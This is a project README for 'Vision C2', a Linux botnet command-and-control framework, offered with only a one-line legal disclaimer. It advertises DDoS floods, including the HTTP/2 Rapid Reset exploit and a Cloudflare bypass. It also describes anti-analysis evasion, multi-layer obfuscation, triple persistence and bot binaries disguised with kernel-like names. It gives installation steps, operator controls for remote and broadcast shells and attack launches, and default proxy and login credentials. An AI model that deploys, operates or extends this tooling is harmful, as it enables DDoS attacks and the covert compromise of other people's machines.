
<div align="center">
 
## Vision C2 - Advanced Linux Botnet Framework


> 14-arch cross-compiled agents. DDoS, RCE, SOCKS5 pivoting. TLS 1.3 transport.
> Full AES encryption. Anti-analysis, anti-sandbox, anti-debugger checks. Full daemonized persistence.
> Zero plaintext in the binary. Driven through a real-time Go TUI.

[Video Showcasing Full Features + Installation](https://www.youtube.com/watch?v=KkIg24KwpB0)

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)
[![Changelog](https://img.shields.io/badge/Changelog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)



<img width="907" height="840" alt="CNC Dashboard (BubbleTea TUI)" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />

</div>

---

## Why Vision?

| | |
|---|---|
| **Automated Setup** | Python wizard handles config, compilation, and deployment. Run once, done. |
| **Encrypted Transport** | TLS 1.3 bot↔C2 over port 443. Indistinguishable from normal HTTPS. |
| **Anti-Analysis** | 40+ VM/sandbox/debugger signatures. Parent process detection. Sandboxes never reach `main()`. |
| **Stealth Driven** | All strings AES-128-CTR encrypted at build time (unique per build split-key derivation). C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Custom UPX packer obfuscates every binary. |
| **HMAC Registration** | MD5 challenge-response with per-campaign sync tokens. Replay-proof. |
| **Triple Persistence** | Systemd + cron watchdog + rc.local. Kill one, the others revive it. |
| **SOCKS5 Pivoting** | RFC 1929 auth. Credentials updated live through the TUI — no redeploy. |
| **Remote Shell** | Full output capture. Built-in Linux shortcuts + post-exploit helpers. |
| **Daemon Stealth** | Fork+setsid, disguised process names, PID lock prevents duplicate agents. |
| **L7 Arsenal** | Cloudflare bypass, HTTP/2 Rapid Reset (CVE-2023-44487), TLS bypass, proxy list support. |

---

## Attack Methods

<details>
<summary><b>Layer 4 — Network/Transport</b></summary>
<br>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | Randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol 47, max payload |
| **DNS Flood** | Randomized query types, DNS reflection |

</details>

<details>
<summary><b>Layer 7 — Application</b></summary>
<br>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487), batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>

---

## Installation

### Prerequisites

```bash
sudo apt update && sudo apt install -y openssl git wget gcc python3 screen 

# Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512 MB / 1 GB | 2 GB+ / 5 GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for your **C2 address**, **admin port** (default `420`), and **TLS cert details**. Output:

```
bins/              → 14 bot binaries (multi-arch)
cnc/certificates/  → server.crt + server.key
server             → CNC binary
setup_config.txt   → Config summary
```

To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bots afterward.

### Starting the CNC

```bash
./server              # TUI mode (default)

./server --split      # Telnet mode on admin port(legacy, only for those needing to manage multiple remote users)
```

Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).

Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)

---

## 🎨 TUI Navigation

| Key | Action |
|---|---|
| `↑/↓` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Dashboard Views

- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
- **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
- **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
- **📜 Connection Logs** — Bot connect/disconnect history

---

## Bot Binaries 

> located in ./bins/ after setup

| Binary | Arch | Target |
|---|---|---|
| `ethd0` | x86_64 (amd64) | Servers, desktops |
| `kworkerd0` | x86 (386) | 32-bit systems |
| `ip6addrd` | ARM64 | RPi 4, phones |
| `mdsync1` | ARMv7 | RPi 2/3 |
| `deferwqd` | MIPS | Routers |
| `devfreqd0` | MIPSLE | Routers (little-endian) |
| *+ 8 more* | Various | IoT, embedded |

> Full binary map: [`build.sh`](tools/build.sh)

---

## Architecture

Vision has two components:

**`cnc/`** — The Command & Control server. Dual-listener: TLS on 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission tiers (Basic / Pro / Admin / Owner) configured in `users.json`.

**`bot/`** — The agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config → daemonize → singleton lock → environment detection → install persistence → DNS-resolve C2 → connect with reconnect loop.

---

## Documentation

| | |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`SETUP.md`](Docs/SETUP.md) | Setup guide |

---

## Legal Disclaimer

**For authorized security research and educational purposes only.** Usage of this tool against targets without prior mutual consent is illegal. The developer assumes no liability for misuse or damage caused by this program.

---

<div align="center">

**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) | [@synacket](https://x.com/synacket)

</div>
